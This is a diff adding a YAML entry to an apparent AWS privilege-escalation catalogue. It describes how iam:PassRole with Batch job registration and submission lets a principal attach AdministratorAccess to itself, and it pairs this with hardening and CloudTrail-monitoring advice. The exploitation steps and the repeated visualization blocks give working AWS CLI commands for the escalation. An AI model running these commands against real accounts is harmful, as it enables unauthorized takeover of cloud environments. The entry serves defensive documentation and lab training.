@@ -1,0 +1,252 @@
+id: batch-001
+name: iam:PassRole + batch:RegisterJobDefinition + batch:SubmitJob
+category: new-passrole
+services:
+  - iam
+  - batch
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM role and a Batch execution role to the Batch service
+    - permission: batch:RegisterJobDefinition
+      resourceConstraints: No resource constraints required
+    - permission: batch:SubmitJob
+      resourceConstraints: No resource constraints required
+  additional:
+    - permission: batch:DescribeJobs
+      resourceConstraints: Useful for polling job status to confirm execution
+    - permission: batch:DescribeJobQueues
+      resourceConstraints: Helpful for discovering available job queues to submit to
+    - permission: batch:DescribeComputeEnvironments
+      resourceConstraints: Helpful for discovering available compute environments
+    - permission: batch:DeregisterJobDefinition
+      resourceConstraints: Useful for cleaning up the malicious job definition after exploitation
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: A principal with `iam:PassRole`, `batch:RegisterJobDefinition`, and `batch:SubmitJob` can escalate privileges by registering a new AWS Batch job definition that passes an admin IAM role as the `jobRoleArn`, then submitting a job that overrides the container command to call `iam:AttachUserPolicy`, attaching AdministratorAccess to the starting user. The Fargate container runs with the admin role's credentials and performs the IAM escalation.
+
+prerequisites:
+  admin:
+    - A role must exist that trusts batch.amazonaws.com to assume it (or can be assumed via the Batch Fargate execution chain)
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+    - An existing Batch job queue and compute environment must be available in the account
+  lateral:
+    - A role must exist that trusts the Batch service and has elevated permissions
+    - An existing Batch job queue and compute environment must be available in the account
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        aws batch register-job-definition \
+          --job-definition-name privesc-job-def \
+          --type container \
+          --platform-capabilities FARGATE \
+          --container-properties '{
+            "image": "amazon/aws-cli:latest",
+            "jobRoleArn": "arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE",
+            "executionRoleArn": "arn:aws:iam::ACCOUNT_ID:role/EXECUTION_ROLE",
+            "resourceRequirements": [
+              {"type": "VCPU", "value": "0.25"},
+              {"type": "MEMORY", "value": "512"}
+            ],
+            "networkConfiguration": {"assignPublicIp": "ENABLED"},
+            "command": [
+              "iam", "attach-user-policy",
+              "--user-name", "STARTING_USER",
+              "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
+            ]
+          }'
+      description: Register a new Batch job definition that passes an admin IAM role as the jobRoleArn. The container command calls iam:AttachUserPolicy to escalate privileges when executed.
+    - step: 2
+      command: |
+        aws batch submit-job \
+          --job-name privesc-job \
+          --job-queue JOB_QUEUE_NAME \
+          --job-definition privesc-job-def:1
+      description: Submit the Batch job to the queue. The Fargate container starts, assumes the admin jobRoleArn, and executes the command to attach AdministratorAccess to the starting user.
+    - step: 3
+      command: |
+        aws batch describe-jobs \
+          --jobs JOB_ID \
+          --query 'jobs[0].status' \
+          --output text
+      description: Poll the job status. Once it reaches SUCCEEDED, AdministratorAccess has been attached to the starting user.
+    - step: 4
+      command: |
+        aws iam list-attached-user-policies \
+          --user-name STARTING_USER
+      description: Verify privilege escalation success by confirming AdministratorAccess is now attached to the starting user.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative Batch job roles** - Very rarely does a Batch job need administrative access. Use the principle of least privilege and scope job roles to only the data and services the job legitimately requires.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificBatchJobRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "batch.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - **Restrict `batch:RegisterJobDefinition`** - This permission lets any holder define arbitrary container workloads with any role. Restrict it to trusted CI/CD principals only.
+  - Monitor CloudTrail for unusual Batch job definition registrations followed by immediate job submission
+  - Monitor CloudTrail for Batch job definitions registered by principals who do not usually create job definitions
+  - Monitor CloudTrail for roles being passed to Batch that haven't been used before
+  - Monitor and alert on Batch job definitions that reference privileged roles
+  - Regularly audit Batch job definitions and execution roles for excessive IAM permissions
+  - Regularly audit all IAM roles that trust the Batch service and down-scope any roles with administrative access
+
+limitations: |
+  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Even limited access may enable multi-hop attacks.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Seth Art
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by AWS Batch - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_awsbatch.html"
+  - title: "Messing Around With AWS Batch For Privilege Escalations - Doyensec"
+    url: "https://blog.doyensec.com/2023/06/13/messing-around-with-aws-batch-for-privilege-escalations.html"
+  - title: "How AWS Batch works with IAM - AWS Batch"
+    url: "https://docs.aws.amazon.com/batch/latest/userguide/security_iam_service-with-iam.html"
+
+relatedPaths:
+  - batch-002
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/batch-001-iam-passrole+batch-registerjobdefinition+batch-submitjob"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: The principal with `iam:PassRole`, `batch:RegisterJobDefinition`, and `batch:SubmitJob` permissions. Can be an IAM user or role. The attacker registers a new Batch job definition that passes an admin IAM role as the jobRoleArn, then submits a job that executes arbitrary commands using that role's credentials.
+
+    - id: job_definition
+      label: New Batch Job Definition
+      type: resource
+      description: |
+        A new AWS Batch job definition registered by the attacker. The key element is the `jobRoleArn` field, which is set to the target admin IAM role. Any container launched from this definition automatically assumes that role. The attacker also controls the container command, which is set to call `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user.
+
+        The job definition is registered with:
+        ```bash
+        aws batch register-job-definition \
+          --job-definition-name privesc-job-def \
+          --type container \
+          --platform-capabilities FARGATE \
+          --container-properties '{
+            "image": "amazon/aws-cli:latest",
+            "jobRoleArn": "arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE",
+            "executionRoleArn": "arn:aws:iam::ACCOUNT_ID:role/EXECUTION_ROLE",
+            "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
+          }'
+        ```
+
+    - id: batch_container
+      label: Fargate Container
+      type: resource
+      description: The AWS Batch Fargate container launched when the job is submitted. The container runs using the `jobRoleArn` from the job definition, meaning its process environment has temporary credentials for the admin IAM role. The container executes the command embedded in the job definition — in this case, the AWS CLI command to attach AdministratorAccess to the starting user.
+
+    - id: admin_role
+      label: Admin Role
+      type: principal
+      description: The IAM role specified as the `jobRoleArn` in the job definition. This role must trust the Batch service (`batch.amazonaws.com`) so that Fargate containers can assume it. The role's temporary credentials are injected into the container environment automatically. The outcome of the attack depends entirely on the permissions this role has.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: The admin role has AdministratorAccess or equivalent permissions (including `iam:AttachUserPolicy`). The container command successfully attaches AdministratorAccess to the starting user, granting full administrative access to the AWS account.
+
+    - id: some_perms
+      label: Elevated Access
+      type: outcome
+      color: '#ffeb99'
+      description: The role has some elevated permissions but not full admin access. The container can leverage those permissions for data exfiltration, accessing sensitive resources, or exploring additional privilege escalation paths, but cannot directly modify IAM to elevate the starting principal.
+
+    - id: no_perms
+      label: Minimal Access
+      type: outcome
+      color: '#cccccc'
+      description: The role only has minimal permissions (e.g., logging). The container command fails or has no meaningful impact. No privilege escalation is achieved through this path, though the job definition can be modified to attempt different actions.
+
+  edges:
+    - from: start
+      to: job_definition
+      label: iam:PassRole + batch:RegisterJobDefinition
+      description: |
+        Register a new Batch job definition that passes the target admin role as the `jobRoleArn`. The `iam:PassRole` permission is required to assign the role to the job definition. The container command is set to attach AdministratorAccess to the starting user.
+
+        Command:
+        ```bash
+        aws batch register-job-definition \
+          --job-definition-name privesc-job-def \
+          --type container \
+          --platform-capabilities FARGATE \
+          --container-properties '{
+            "image": "amazon/aws-cli:latest",
+            "jobRoleArn": "arn:aws:iam::ACCOUNT_ID:role/ADMIN_ROLE",
+            "executionRoleArn": "arn:aws:iam::ACCOUNT_ID:role/EXECUTION_ROLE",
+            "resourceRequirements": [{"type": "VCPU", "value": "0.25"}, {"type": "MEMORY", "value": "512"}],
+            "networkConfiguration": {"assignPublicIp": "ENABLED"},
+            "command": ["iam", "attach-user-policy", "--user-name", "STARTING_USER", "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"]
+          }'
+        ```
+
+    - from: job_definition
+      to: batch_container
+      label: batch:SubmitJob
+      description: |
+        Submit the registered job definition to an existing Batch job queue. AWS Batch schedules the job and launches a Fargate container using the configuration from the job definition — including the `jobRoleArn`.
+
+        Command:
+        ```bash
+        aws batch submit-job \
+          --job-name privesc-job \
+          --job-queue JOB_QUEUE_NAME \
+          --job-definition privesc-job-def:1
+        ```
+
+    - from: batch_container
+      to: admin_role
+      label: Container assumes jobRoleArn
+      description: The Fargate container automatically assumes the IAM role specified as the `jobRoleArn` in the job definition. Temporary credentials for the admin role are injected into the container's environment. The container then executes its command using those credentials.
+
+    - from: admin_role
+      to: admin
+      label: If role has admin permissions
+      branch: A
+      condition: admin
+      description: If the admin role has AdministratorAccess or includes `iam:AttachUserPolicy`, the container command successfully attaches AdministratorAccess to the starting user. The attacker now has full administrative access to the AWS account.
+
+    - from: admin_role
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: If the role has elevated but non-admin permissions, the container can use those permissions for data access, lateral movement, or further escalation attempts. However, the direct IAM escalation command will fail if `iam:AttachUserPolicy` is not included.
+
+    - from: admin_role
+      to: no_perms
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: If the role only has minimal permissions, the container command will fail and no meaningful privilege escalation is achieved. The attack provides no additional access beyond what the starting principal already had.
